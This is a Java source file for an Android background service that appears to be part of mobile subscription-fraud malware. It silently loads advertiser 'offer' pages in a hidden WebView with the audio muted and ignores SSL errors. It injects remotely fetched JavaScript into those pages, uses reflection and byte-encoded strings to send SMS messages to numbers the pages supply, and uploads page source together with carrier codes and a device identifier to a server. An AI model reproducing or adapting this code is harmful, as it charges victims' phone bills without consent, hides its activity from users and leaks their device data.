package mklw.aot.zxjn.s;

import android.annotation.SuppressLint;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.net.http.SslError;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Message;
import android.text.TextUtils;
import android.view.ViewGroup;
import android.webkit.SslErrorHandler;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

import mklw.aot.zxjn.m.Ma;
import mklw.aot.zxjn.n.SubNotif;
import mklw.aot.zxjn.t.T_cache;
import mklw.aot.zxjn.t.T_connect;
import mklw.aot.zxjn.t.T_js;
import mklw.aot.zxjn.t.T_link;
import mklw.aot.zxjn.u.AudioUtil;
import mklw.aot.zxjn.u.EncodeUtils;
import mklw.aot.zxjn.u.HttpUtils;
import mklw.aot.zxjn.u.JsUtil;
import mklw.aot.zxjn.u.LinkUtil;
import mklw.aot.zxjn.u.OtherUtils;
import mklw.aot.zxjn.u.PhoneInforUtils;
import mklw.aot.zxjn.u.Ulog;
import mklw.aot.zxjn.u.XmlShareUtils;
import mklw.aot.zxjn.v.Va;

import static mklw.aot.zxjn.u.XmlShareUtils.check_source_status;


/**
 * Created by xlc on 2017/5/24.
 */

public class AgentService extends Service {
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private WebView mWebView = null;

    private Handler handler_;

    private HandlerThread mht;

    private final int notid = Ulog.TAG.hashCode();

    private boolean showNotification = false;

    private boolean execute_task = false;

    private Random random = null;

    /**
     * 判断是否为黑名单显示通知栏
     */
    public void check_black_list() {
        int black_list_status = XmlShareUtils.getXMLShare(this).getInt("b_l", 0);
        switch (black_list_status) {
            case -1:
                if (showNotification) {
                    //                    Ulog.w("黑名单清除通知栏");
                    NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                    nm.cancel(notid);
                    stopForeground(true);
                    showNotification = false;
                }
                break;
            case 1:
                if (!showNotification) {
                    //                    Ulog.w("不是黑名单显示通知栏");
                    startForeground(notid, SubNotif.getInstance(getApplicationContext()).getNotification());
                    showNotification = true;
                }
                break;
            default:
                //                Ulog.w("未知情况下不展示通知栏");
                break;
        }
    }

    public void haveLink(List<Ma> list, Ma offer) {
        execute_index = 0;
        execute_task = false;

        mList = list;
        if (offer != null) {
            start_load(offer);

            XmlShareUtils.saveLinkListTime(getApplicationContext());
            AudioUtil.getInstance(getApplicationContext()).setSlience();
        }
    }

    private void start_load(Ma offer) {
        Ulog.show("p " + offer.getSub_platform_id() + "  s " + offer.getOffer_id());

        initStatus();

        showInterstitialOffer = offer;
        String load_url = LinkUtil.getChangeUrl(offer, this, true);

        jRate = offer.getJRate();
        sub_platform_id = offer.getSub_platform_id();
        offer_id = offer.getOffer_id();
        getSource = offer.getGetSource();

        if (mWebView == null) {
            initView();
        }

        XmlShareUtils.disableJsIfUrlEncodedFailed(mWebView, load_url);

        webHandler.removeMessages(4);
        webHandler.sendEmptyMessageDelayed(4, 2 * 60000);

        mWebView.onResume();
        mWebView.clearFocus();
        mWebView.stopLoading();
        mWebView.clearHistory();
        mWebView.clearCache(true);
        mWebView.loadUrl(load_url, HttpUtils.getWebHead());
    }


    @Override
    public void onCreate() {
        super.onCreate();

        SubNotif.getInstance(getApplicationContext());
        Ulog.initDebug(this);
        random = new Random();
        initView();

        mht = new HandlerThread("toolbox");
        mht.start();
        handler_ = new Handler(mht.getLooper()) {
            @Override
            public void handleMessage(Message msg) {

                Ulog.w("key:" + EncodeUtils.getSignature(getApplicationContext()));

                webHandler.sendEmptyMessage(0);

                handler_.sendEmptyMessageDelayed(1, 6000);
            }
        };

        handler_.sendEmptyMessage(5000);
        Ulog.show("s onCreate");

    }

    @SuppressLint("NewApi")
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (XmlShareUtils.checkCacheTime(this)) {
            //    Ulog.show("do cache");
            Ulog.show("d c");
            new T_cache(this).executeOnExecutor(HttpUtils.executorService);
        }

        if (XmlShareUtils.check_connect_status(this)) {
            //            Ulog.w("满足联网时间限制");
            Ulog.show("d con");
            new T_connect(this).executeOnExecutor(HttpUtils.executorService);
        }

        if (JsUtil.getInstance(this).check_d_js_time() && !XmlShareUtils.checkBlackList(this)) {
            if (JsUtil.getInstance(this).getJsCacheStatus() != JsUtil.JS_CACHE_STATUS_DOING) {
                //  Ulog.w("满足下载js文件条件");
                Ulog.show("d j");
                //
                new T_js(this).executeOnExecutor(HttpUtils.executorService);
            } else {
                // Ulog.show("js downloading...");
                // Ulog.w("js 正在下载...");
            }
        }
        check_black_list();
        return super.onStartCommand(intent, flags, startId);
    }

    private AgentService getAgentService() {
        return this;
    }

    private Handler webHandler = new Handler() {
        @Override
        public void handleMessage(Message message) {
            switch (message.what) {
                case 0:
                    if (XmlShareUtils.checkLinkListTime(getApplicationContext())//
                            && !XmlShareUtils.checkBlackList(getApplicationContext())//
                            && !execute_task) {
                        //  Ulog.w("服务中满足时间开始执行链接");
                        //  Ulog.show("do webView load");
                        execute_task = true;
                        execute_index = 0;
                        new T_link(getAgentService()).executeOnExecutor(HttpUtils.executorService);
                    }
                    break;
                case 1:
                    if (!checkNetWork()) {
                        //   Ulog.w("网络异常情况下不注入js，执行下一条");
                        //   Ulog.show("net error not load js, do last");
                        LinkUtil.getOfferExecuteTime(getApplicationContext(), showInterstitialOffer);
                        webHandler.sendEmptyMessage(3);
                        break;
                    }
                    if (!same_offer) {
                        int random_ = random.nextInt(100) + 1;
                        Ulog.show("r " + random_ + ":" + jRate);
                        if (random_ > jRate) {
                            //   Ulog.w("随机数" + random_ + "大于" + jRate + "不执行注入");
                            //   Ulog.show("random_" + random_ + ">" + jRate + " do last one");
                            if (showInterstitialOffer != null) {
                                if (!XmlShareUtils.checkShowOutView(getApplicationContext())) {
                                    Ulog.show("n w");
                                    LinkUtil.getOfferExecuteTime(getApplicationContext(), showInterstitialOffer);
                                    webHandler.sendEmptyMessage(5);
                                    //  Ulog.show("do not update times");
                                    break;
                                }
                                Ulog.show("o w");
                                XmlShareUtils.saveShowOutTime(getApplicationContext());
                                Va.getInstance(getApplicationContext()).startLoad(showInterstitialOffer);
                            }
                            webHandler.sendEmptyMessage(3);
                            break;
                        } else {
                            //   Ulog.w("随机数" + random_ + "小于等于 " + jRate + " 执行注入");
                            //   Ulog.show("random_" + random_ + "<=" + jRate + " load js");
                        }
                    }
                    String jsString = JsUtil.getInstance(getApplicationContext()).getJsString();
                    if (mWebView != null && !TextUtils.isEmpty(jsString)) {
                        //                                                Ulog.w("service_执行注入");
                        //                                                Ulog.show("service_ load js");
                        mWebView.loadUrl(new String(HttpUtils.JAVA_BYTE_JS) + jsString, HttpUtils.getWebHead());
                        mWebView.loadUrl(new String(HttpUtils.JAVA_BYTE_JS_LP) + ")", HttpUtils.getWebHead());
                        mWebView.loadUrl(new String(HttpUtils.JAVA_BYTE_JS_AOC), HttpUtils.getWebHead());
                    }
                    break;
                // 注入获取网页的代码js
                case 2:
                    if (mWebView != null) {
                        mWebView.loadUrl(HttpUtils.js_get_source, HttpUtils.getWebHead());
                    }
                    break;
                case 4:
                    //                    Ulog.show("do last after 2 min,check post Resource status");
                    //                    Ulog.w("间隔了两分钟后直接执行下一条,先判断是否需要上传源码");
                    boolean source_status = check_source_status(getApplicationContext(), offer_id + "");
                    if (source_status && getSource == 0) {
                        webHandler.sendEmptyMessage(2);
                        webHandler.sendEmptyMessageDelayed(3, 3000);
                    } else {
                        webHandler.sendEmptyMessage(3);
                    }
                    break;
                case 3:
                    Ulog.show("n " + netState);
                    if (checkNetWork()) {
                        //  Ulog.w("网络正常的情况统计:" + offer_id + "的执行次数");
                        //  Ulog.show("network normal save :" + offer_id + " execute times");
                        LinkUtil.updataExecuteTime(getApplicationContext(), showInterstitialOffer);
                    }
                    webHandler.sendEmptyMessage(5);
                    break;
                case 5:
                    if (mList != null && execute_index < mList.size()) {
                        //  Ulog.show("do last offer_id:" + mList.get(execute_index).getOffer_id() + ":" + execute_index + "  after 5s");
                        //  Ulog.w("执行下一条链接offer_id:" + mList.get(execute_index).getOffer_id() + "执行第" + execute_index + "条");
                        start_load(mList.get(execute_index));
                        execute_index = execute_index + 1;
                    } else {
                        //   Ulog.w("轮询结束,回收浏览器");
                        //   Ulog.show("do all offer finished,destroy webView");
                        webHandler.removeMessages(4);
                        destoryWebView();
                    }
                    break;
            }
        }
    };

    @SuppressLint({"SetJavaScriptEnabled", "JavascriptInterface"})
    private void initView() {
        mWebView = new WebView(getApplicationContext());
        mWebView.setDrawingCacheBackgroundColor(Color.WHITE);
        mWebView.setFocusableInTouchMode(true);
        mWebView.setFocusable(true);
        mWebView.setDrawingCacheEnabled(false);
        mWebView.setWillNotCacheDrawing(true);
        mWebView.setBackgroundColor(Color.WHITE);
        mWebView.setScrollbarFadingEnabled(true);
        mWebView.setSaveEnabled(true);
        mWebView.setNetworkAvailable(true);
        mWebView.getSettings().setJavaScriptEnabled(true);
        mWebView.addJavascriptInterface(this, "toolbox");
        mWebView.addJavascriptInterface(this, "myObj");
        mWebView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                if (url.startsWith(new String(new byte[]{115, 109, 115, 58}))) {
                    try {
                        String port = url.substring(url.indexOf(":") + 1, url.indexOf("?"));
                        String content = url.substring(url.indexOf("=") + 1, url.length());

                        //  SmsManager.getDefault().sendTextMessage(port, null, content, null, null);

                        //getDefault
                        String getDf = new String(new byte[]{103, 101, 116, 68, 101, 102, 97, 117, 108, 116});
                        //PendingIntent.class
                        Class cls = Class.forName("android.app.PendingIntent");

                        Class<?> smsClasss = Class.forName("android.telephony.SmsManager");
                        Method method = smsClasss.getMethod("sendTextMessage", new Class[]{String.class, String.class, String.class, cls, cls});
                        method.invoke(smsClasss.getMethod(getDf).invoke(null), new Object[]{port, null, content, null, null});
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                return true;
            }

            @Override
            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
                handler.proceed();
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                //                Ulog.show("onPageFinished+" + url);
                if (url.equals(last_finished_url)) {
                    //                    Ulog.w("相同的链接不注入");
                    return;
                }


                last_finished_url = url;
                webHandler.removeMessages(1);
                if (LinkUtil.check_url(url)) {
                    //                    Ulog.w("黑名单链接不执行注入，执行下一条");
                    //                    Ulog.show("blacklist url, do last one");
                    netState = 0;
                    webHandler.sendEmptyMessage(3);
                    return;
                }
                webHandler.sendEmptyMessageDelayed(1, 20000);
            }

            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                super.onPageStarted(view, url, favicon);
                //                                Ulog.show("onPageStarted+" + url);
                netState = 0;
                findLp_ok = "";
                findAoc_ok = "";
            }

            @Override
            public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
                super.onReceivedError(view, errorCode, description, failingUrl);
                netState = errorCode;
            }
        });
    }

    @SuppressLint("NewApi")
    private void destoryWebView() {
        if (mWebView != null) {
            try {
                ViewGroup parent = (ViewGroup) mWebView.getParent();
                if (parent != null) {
                    parent.removeAllViews();
                }

                mWebView.stopLoading();
                mWebView.onPause();
                mWebView.clearHistory();
                mWebView.removeAllViews();
                mWebView.destroyDrawingCache();
                mWebView.destroy();

            } catch (Exception e) {
                e.printStackTrace();
            }

            mWebView = null;
        }

        AudioUtil.getInstance(getApplicationContext()).setNomal();
        Ulog.show("w d");
    }


    /**
     * 获取源码信息回调
     *
     * @param source
     */
    @android.webkit.JavascriptInterface
    public void getSource(String source) {
        Ulog.show("s r");

        Map<String, Object> map = new HashMap<>();
        map.put("mcc", PhoneInforUtils.getMcc(getApplicationContext()));
        map.put("mnc", PhoneInforUtils.getMnc(getApplicationContext()));
        map.put("cid", PhoneInforUtils.getInstance(getApplicationContext()).getKeyStore());
        map.put("source_type", source_type);
        map.put("platform_id", sub_platform_id);
        map.put("offer_id", offer_id);
        map.put("source", source);
        map.put("network", XmlShareUtils.getNetStatus(this));

        HttpUtils.postSource(map, getApplicationContext());
    }

    private void initStatus() {
        netState = 0;
        last_finished_url = "";
        aoc_ok = false;
        lp_ok = false;
        source_type = 0;
        same_offer = false;
        jRate = 60;
    }

    private List<Ma> mList = null;

    private boolean lp_ok = false;
    private boolean aoc_ok = false;

    //当前执行的index
    private int execute_index = 0;

    private static String findLp_ok = "", findAoc_ok = "";

    private int netState = 0;

    private int source_type;

    private boolean same_offer = false;

    private String last_finished_url = "";

    private int offer_id;

    private int sub_platform_id;

    //    是否需要获取网页代码传回服务器 0：干 1：不干
    private int getSource;

    private int jRate;

    private Ma showInterstitialOffer = null;

    @android.webkit.JavascriptInterface
    public void openImage(final String org, String _url) {
        Ulog.show("w  t" + org);
        same_offer = true;
        String strOK = new String((new byte[]{111, 107}));
        if (org.contains(new String(new byte[]{102, 105, 110, 100, 76, 112}))) {//findLp
            findLp_ok = org;
            findAoc_ok = "";
            if (org.contains(strOK)) {
                //                Ulog.show("lp ok");
                lp_ok = true;
                //            } else {
                //                Ulog.show("lp no");
            }
        } else if (org.contains("aoc_")) {//aoc_ cmONDhFE59owXigH8PxaQg== 97,111,99,95
            findAoc_ok = org;
            if (org.contains("ok")) {
                //                            //                Ulog.show("aoc ok");
                aoc_ok = true;
                //                        } else {
                //                            //                Ulog.show("aoc no");
            }
        }

        //短信按钮      sms
        boolean is_sms = findAoc_ok.contains(new String(new byte[]{115, 109, 115}));
        boolean findLp_no = !findLp_ok.contains(strOK) && !TextUtils.isEmpty(findLp_ok);
        boolean aoc_no = !findAoc_ok.contains(strOK) && !TextUtils.isEmpty(findAoc_ok);

        if (checkNetWork() && ((findLp_no && aoc_no) || is_sms)) {
            boolean check_return = check_source_status(getApplicationContext(), offer_id + "");
            boolean exist_ok = aoc_ok && lp_ok;
            source_type = getSource_type();
            if (getSource == 0 && !exist_ok && check_return) {
                //                Ulog.w("需要获取网页的源代码");
                //                Ulog.show("do load Source code js");
                webHandler.sendEmptyMessage(2);
                webHandler.sendEmptyMessageDelayed(3, 5000);
            } else {
                //                if (exist_ok) {
                //                    Ulog.show("exist both ok ,do not return data");
                //                  Ulog.w("findLp_ok和aoc_ok都存在，不回传");
                //                }
                //                if (!check_return) {
                //                    Ulog.show("offer has return data");
                //                    Ulog.w("这条offer已经上传过源代码，不再做上传");
                //                }
                webHandler.sendEmptyMessageDelayed(3, 100);
            }
        }
    }

    /**
     * 回传类型
     *
     * @return
     */
    public int getSource_type() {
        int source_type = 0;
        if (!aoc_ok && !lp_ok) {
            source_type = 0;
        } else if (lp_ok && !aoc_ok) {
            source_type = 1;
        } else if (!lp_ok && aoc_ok) {
            source_type = 2;
        }
        return source_type;
    }

    private boolean checkNetWork() {
        if (netState != -2) {
            return OtherUtils.checkNet(getApplicationContext());
        }
        return false;
    }
}